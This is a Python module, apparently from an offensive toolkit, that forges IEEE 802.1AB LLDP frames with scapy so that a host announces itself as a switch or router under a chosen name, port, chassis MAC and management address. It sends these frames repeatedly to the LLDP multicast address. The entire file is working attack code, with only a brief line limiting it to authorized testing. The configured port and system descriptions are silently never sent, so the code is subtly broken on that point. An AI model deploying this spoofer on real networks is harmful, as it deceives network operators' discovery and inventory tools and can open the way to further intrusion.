"""LLDP spoofing: advertise a forged network device over IEEE 802.1AB LLDP.

Link Layer Discovery Protocol announces each device's chassis, port, name, capabilities
and management address to its direct neighbors. LLDP frames are not authenticated, so a
host can announce itself as a switch or router with a chosen name and address. Receivers
that keep LLDP neighbors, and tools that show them, record the forged device.

This module sends LLDP advertisements to the nearest-bridge multicast address, with the
mandatory TLVs (chassis ID, port ID, TTL) and the optional ones the operator chooses.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import struct
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, Raw, sendp
from scapy.packet import Packet

from macabre.attacks.common import Runner, normalize_unicast_mac, read_interface_mac, run_command

LLDP_MAC = "01:80:c2:00:00:0e"      # nearest bridge group address
LLDP_ETHERTYPE = 0x88CC
DEFAULT_TTL = 120                    # seconds a neighbor is kept
DEFAULT_INTERVAL = 30.0              # LLDP default transmit interval
CAPABILITIES_BRIDGE_ROUTER = 0x0004 | 0x0010   # bridge, router

TLV_END = 0
TLV_CHASSIS_ID = 1
TLV_PORT_ID = 2
TLV_TTL = 3
TLV_PORT_DESCRIPTION = 4
TLV_SYSTEM_NAME = 5
TLV_SYSTEM_DESCRIPTION = 6
TLV_CAPABILITIES = 7
TLV_MANAGEMENT_ADDRESS = 8
MAX_STRING = 255


def _tlv(kind: int, value: bytes) -> bytes:
    """Each TLV header is 7 bits of type and 9 bits of length, in one 16-bit field."""
    if len(value) > 511:
        raise ValueError("TLV value is too long.")
    return struct.pack("!H", (kind << 9) | len(value)) + value


def _text(value: str, name: str) -> bytes:
    data = value.encode("ascii", errors="strict")
    if not data or len(data) > MAX_STRING:
        raise ValueError(f"{name} must be 1 to {MAX_STRING} ASCII characters.")
    return data


@dataclass(frozen=True)
class LldpSpoofingConfig:
    iface: str                          # attacker interface, on the segment with the receiver
    system_name: str = "MACabre-SW"     # name of the forged device
    port_id: str = "GigabitEthernet0/1"  # interface name the neighbor reports itself on
    port_description: str = ""          # optional port description; empty = omitted
    system_description: str = "MACabre LLDP"  # optional system description
    chassis_mac: str = ""               # chassis MAC advertised; empty = this interface's MAC
    capabilities: int = CAPABILITIES_BRIDGE_ROUTER
    address: str = ""                   # IPv4 management address; empty = omitted
    ttl: int = DEFAULT_TTL              # seconds a receiver keeps the neighbor
    count: int = 0                      # advertisements to send; 0 = run until stopped
    interval: float = DEFAULT_INTERVAL  # seconds between advertisements
    dry_run: bool = False               # build advertisements but do not send them

    def __post_init__(self) -> None:
        _text(self.system_name, "System name")
        _text(self.port_id, "Port ID")
        if self.port_description:
            _text(self.port_description, "Port description")
        if self.system_description:
            _text(self.system_description, "System description")
        if self.chassis_mac:
            normalize_unicast_mac(self.chassis_mac)
        if not 0 <= self.capabilities <= 0xFFFF:
            raise ValueError("Capabilities must fit in 16 bits.")
        if self.address:
            try:
                ipaddress.IPv4Address(self.address)
            except ValueError as exc:
                raise ValueError("Address must be an IPv4 address.") from exc
        if not 0 <= self.ttl <= 65535:
            raise ValueError("TTL must be between 0 and 65535 seconds.")
        if self.count < 0:
            raise ValueError("Count cannot be negative.")
        if self.interval < 0:
            raise ValueError("Interval cannot be negative.")


@dataclass
class LldpSpoofingStats:
    sender_mac: str = ""
    frames: int = 0
    status: str = ""


def lldp_payload(
    chassis_mac: str,
    system_name: str,
    port_id: str,
    ttl: int = DEFAULT_TTL,
    port_description: str = "",
    system_description: str = "",
    capabilities: int = CAPABILITIES_BRIDGE_ROUTER,
    address: str = "",
) -> bytes:
    """The LLDP data unit: mandatory TLVs first, optional TLVs next, then the end marker."""
    tlvs = [
        _tlv(TLV_CHASSIS_ID, b"\x04" + bytes.fromhex(normalize_unicast_mac(chassis_mac).replace(":", ""))),
        _tlv(TLV_PORT_ID, b"\x05" + _text(port_id, "Port ID")),
        _tlv(TLV_TTL, struct.pack("!H", ttl)),
    ]
    if port_description:
        tlvs.append(_tlv(TLV_PORT_DESCRIPTION, _text(port_description, "Port description")))
    tlvs.append(_tlv(TLV_SYSTEM_NAME, _text(system_name, "System name")))
    if system_description:
        tlvs.append(_tlv(TLV_SYSTEM_DESCRIPTION, _text(system_description, "System description")))
    tlvs.append(_tlv(TLV_CAPABILITIES, struct.pack("!HH", capabilities, capabilities)))
    if address:
        # Management address: length, IANA family 1 (IPv4), address, interface numbering (ifIndex 1), OID length 0.
        management = bytes([5, 1]) + ipaddress.IPv4Address(address).packed + bytes([2]) + struct.pack("!I", 1) + bytes([0])
        tlvs.append(_tlv(TLV_MANAGEMENT_ADDRESS, management))
    tlvs.append(_tlv(TLV_END, b""))
    return b"".join(tlvs)


def build_lldp_frame(
    sender_mac: str,
    chassis_mac: str,
    system_name: str,
    port_id: str,
    address: str = "",
    ttl: int = DEFAULT_TTL,
    capabilities: int = CAPABILITIES_BRIDGE_ROUTER,
) -> Packet:
    """LLDP advertisement from `sender_mac`, claiming `chassis_mac` as the chassis."""
    payload = lldp_payload(chassis_mac, system_name, port_id, ttl, capabilities=capabilities, address=address)
    return Ether(src=normalize_unicast_mac(sender_mac), dst=LLDP_MAC, type=LLDP_ETHERTYPE) / Raw(payload)


def build_frame(sender_mac: str, config: LldpSpoofingConfig) -> Packet:
    """The advertisement described by `config`, from `sender_mac`."""
    return build_lldp_frame(
        sender_mac,
        config.chassis_mac or sender_mac,
        config.system_name,
        config.port_id,
        config.address,
        config.ttl,
        config.capabilities,
    )


def run_lldp_spoofing(
    config: LldpSpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[LldpSpoofingStats], None],
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
) -> LldpSpoofingStats:
    """Send LLDP advertisements for the forged device until `count` or `stop_event`."""
    run = run or run_command
    send = send or sendp

    if config.dry_run:
        stats = LldpSpoofingStats(
            status=(
                f"Dry run: would advertise LLDP device {config.system_name} on port {config.port_id} "
                f"every {config.interval:g} s. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    sender_mac = read_interface_mac(config.iface, run)
    stats = LldpSpoofingStats(sender_mac=sender_mac)
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        send(build_frame(sender_mac, config), iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
